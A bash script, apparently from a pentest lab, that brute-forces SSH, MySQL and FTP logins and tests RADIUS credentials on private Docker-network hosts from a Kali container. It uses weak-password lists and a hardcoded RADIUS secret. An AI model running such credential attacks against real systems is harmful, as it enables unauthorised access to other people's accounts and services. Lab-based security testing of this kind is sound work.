#!/bin/bash
# Credential testing script - brute force attempts
# Tests weak credentials and common passwords

KALI_CONTAINER="pentest-kali"
OUTPUT_DIR="/root/pentest-results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "Starting credential testing..."
echo "Timestamp: $TIMESTAMP"

docker exec $KALI_CONTAINER mkdir -p $OUTPUT_DIR

# SSH brute force
echo "Testing SSH credentials..."
SSH_TARGET="172.22.0.5"
SSH_USERS=("root" "admin" "user" "guest")
SSH_PASSWORDS=("root123" "admin123" "password" "guest")
OUTPUT_FILE="${OUTPUT_DIR}/ssh_bruteforce_${TIMESTAMP}.txt"

for user in "${SSH_USERS[@]}"; do
    for pass in "${SSH_PASSWORDS[@]}"; do
        echo "Testing: $user:$pass"
        docker exec $KALI_CONTAINER sh -c "echo '$pass' | timeout 2 sshpass -p '$pass' ssh -o StrictHostKeyChecking=no $user@$SSH_TARGET 'echo SUCCESS' 2>&1" >> "$OUTPUT_FILE" || true
    done
done

# MySQL brute force
echo "Testing MySQL credentials..."
MYSQL_TARGET="172.22.0.3"
MYSQL_USERS=("root" "admin")
MYSQL_PASSWORDS=("root" "admin123")
OUTPUT_FILE="${OUTPUT_DIR}/mysql_bruteforce_${TIMESTAMP}.txt"

for user in "${MYSQL_USERS[@]}"; do
    for pass in "${MYSQL_PASSWORDS[@]}"; do
        echo "Testing: $user:$pass"
        docker exec $KALI_CONTAINER sh -c "timeout 2 mysql -h $MYSQL_TARGET -u $user -p'$pass' -e 'SELECT 1' 2>&1" >> "$OUTPUT_FILE" || true
    done
done

# FTP brute force
echo "Testing FTP credentials..."
FTP_TARGET="172.22.0.4"
FTP_USERS=("anonymous" "ftpuser")
FTP_PASSWORDS=("" "password123")
OUTPUT_FILE="${OUTPUT_DIR}/ftp_bruteforce_${TIMESTAMP}.txt"

for user in "${FTP_USERS[@]}"; do
    for pass in "${FTP_PASSWORDS[@]}"; do
        echo "Testing: $user:$pass"
        docker exec $KALI_CONTAINER sh -c "timeout 2 ftp -n $FTP_TARGET <<EOF
user $user $pass
quit
EOF
" >> "$OUTPUT_FILE" 2>&1 || true
    done
done

# RADIUS credential testing
echo "Testing RADIUS credentials..."
RADIUS_TARGET="172.21.0.3"
RADIUS_SECRET="schoolradius123"
OUTPUT_FILE="${OUTPUT_DIR}/radius_test_${TIMESTAMP}.txt"

# Test known credentials
docker exec $KALI_CONTAINER sh -c "radtest guest guest $RADIUS_TARGET 0 $RADIUS_SECRET 2>&1" >> "$OUTPUT_FILE" || true
docker exec $KALI_CONTAINER sh -c "radtest student01 Student123! $RADIUS_TARGET 0 $RADIUS_SECRET 2>&1" >> "$OUTPUT_FILE" || true

echo ""
echo "Credential testing complete!"
echo "Results saved in Kali container at: $OUTPUT_DIR"
